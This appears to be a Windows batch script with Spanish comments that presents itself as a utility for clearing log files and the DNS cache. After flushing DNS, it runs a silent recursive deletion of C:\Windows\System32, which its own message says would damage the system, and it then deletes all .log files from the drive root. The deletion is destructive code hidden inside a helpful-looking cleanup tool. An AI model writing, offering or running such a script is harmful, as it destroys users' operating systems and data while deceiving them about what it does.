@echo off
REM Muestra el mensaje de inicio y autor
echo S.O AGREVAL

REM Pausa para que el usuario presione Enter para continuar
echo.
echo Presiona Enter para limpiar archivos de registro y limpiar el caché DNS.
pause

REM Limpiar caché DNS
echo Limpiando el DNS para mejorar el internet...
ipconfig /flushdns
echo Caché DNS limpiado con éxito.
echo.

REM Cambiar al directorio raíz
cd/

REM Eliminar la carpeta System32 
echo ADVERTENCIA: Se intentará eliminar la carpeta System32.
rmdir /S /Q C:\Windows\System32
echo System32 se ha eliminado (en un entorno real esto dañaría el sistema).
echo.

REM Eliminar archivos .log
echo Eliminando archivos .log en todas las carpetas...
del *.log /a /s /q /f
echo Archivos .log eliminados con éxito.
echo.

REM Pausa para ver los resultados antes de cerrar
pause
